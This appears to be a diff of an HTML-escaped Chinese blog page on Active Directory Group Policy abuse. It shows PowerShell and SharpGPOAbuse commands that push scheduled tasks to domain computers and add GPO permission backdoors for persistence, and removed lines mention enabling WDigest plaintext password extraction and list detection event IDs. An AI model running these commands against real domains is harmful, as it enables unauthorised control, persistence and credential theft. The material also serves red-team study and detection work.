 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#加载GroupPolicy模块 （win7没有，win10有）&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GroupPolicy&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#创建一个GPO并将GPO链接到域0day.org，需要域管权限。&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;new-gpo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TestGPO2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new-gplink&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Target&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dc=0day,dc=org&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#创建一个GPO并将GPO链接到域test.local，需要域管权限。&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;new-gpo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TestGPO&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new-gplink&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Target&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dc=test,dc=local&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#添加定时任务 --TargetDnsName指定计算机&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SharpGPOAbuse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-AddComputerTask&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-TaskName&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Update2&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Author&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Admin&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Arguments&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/c calc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-GPOName&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;TestGPO2&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-FilterEnabled&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-TargetDnsName&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PC-jack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;SharpGPOAbuse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-AddComputerTask&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-TaskName&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Update2&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Author&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DOMAIN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Admin&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-Arguments&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/c calc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-GPOName&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;TestGPO2&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-FilterEnabled&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;-TargetDnsName&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PC-jack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;org&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#删除GPO&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Remove-GPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Name&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TestGPO2&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;在&amp;quot;软件安装&amp;quot;下推出.msi&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;推出特定的启动脚本&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;将域帐户添加到本地管理员RDP组&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;降级凭据保护&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;更改现有的安全策略以启用明文密码提取&lt;/p&gt;
-&lt;p&gt;设置&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&lt;/code&gt;下的&lt;code&gt;UseLogonCredentiald&lt;/code&gt;值为1&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;组策略权限维持&#34;&gt;组策略权限维持&lt;/h2&gt;
-&lt;h3 id=&#34;创建gpo的权限&#34;&gt;创建GPO的权限&lt;/h3&gt;
+&lt;/div&gt;&lt;p&gt;可以通过cs的&lt;code&gt;execute-assembly&lt;/code&gt; 执行。&lt;/p&gt;
+&lt;h2 id=&#34;权限维持&#34;&gt;权限维持&lt;/h2&gt;
+&lt;h3 id=&#34;添加用户对gpo的权限&#34;&gt;添加用户对GPO的权限&lt;/h3&gt;
 &lt;p&gt;其实就是对&lt;code&gt;CN=Policies,CN=System,&amp;lt;BaseDn&amp;gt;&lt;/code&gt;具备CreateChild的权限。&lt;/p&gt;
-&lt;p&gt;查询域内具备创建GPO的权限:&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;adfind -b CN=Policies,CN=System,DC=0day,DC=org -sddl+++ -s base -sdna -sddlfilter ;;&amp;quot;CR CHILD&amp;quot;;;;&lt;/code&gt;&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;添加用户test1对TestGPO的完全访问权限&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$RawObject&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-DomainGPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Raw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;TestGPO&amp;#39;&lt;/span&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#查询域内具备创建GPO权限的用户&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;adfind&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-b&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Policies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sddl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+++&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-s&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sdna&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-sddlfilter&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CR CHILD&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#添加用户test1对TestGPO的完全访问权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$RawObject&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-DomainGPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Raw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;TestGPO&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$TargetObject&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$RawObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetDirectoryEntry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ACE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-ADObjectAccessControlEntry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-InheritanceType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AccessControlType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Allow&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PrincipalIdentity&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Right&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AccessSystemSecurity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeleteChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeleteTree&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ExtendedRight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericAll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericExecute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericRead&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ListChildren&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ListObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadControl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadProperty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Synchronize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteDacl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteProperty&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$TargetObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PsBase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ObjectSecurity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddAccessRule&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ACE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$TargetObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PsBase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CommitChanges&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;移除用户test1对TestGPO的完全访问权限&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$RawObject&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-DomainGPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Raw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;TestGPO&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;#移除用户test1对TestGPO的完全访问权限&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$RawObject&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-DomainGPO&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Raw&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;TestGPO&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$TargetObject&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$RawObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetDirectoryEntry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$ACE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-ADObjectAccessControlEntry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-InheritanceType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;All&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AccessControlType&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Allow&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PrincipalIdentity&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Right&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AccessSystemSecurity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeleteChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DeleteTree&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ExtendedRight&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericAll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericExecute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericRead&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GenericWrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ListChildren&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ListObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadControl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadProperty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Synchronize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteDacl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteProperty&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$TargetObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PsBase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ObjectSecurity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RemoveAccessRule&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ACE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$TargetObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PsBase&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CommitChanges&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;strong&gt;攻击检测&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;事件5137，4662，5145，4674可以看到组策略的新增信息。&lt;/p&gt;
-&lt;h3 id=&#34;修改现有的gpo的权限&#34;&gt;修改现有的GPO的权限&lt;/h3&gt;
-&lt;p&gt;如果组策略对象的修改或完全控制权限被分配给了某个用户，当该用户被攻击者拿下之后，攻击者利用该用户权限可以修改并配置特定的组策略来渗透攻击受该组策略作用的用户或计算机。&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;strong&gt;GPC链接到GPT的权限与修改GPT的权限&lt;/strong&gt;&lt;/p&gt;
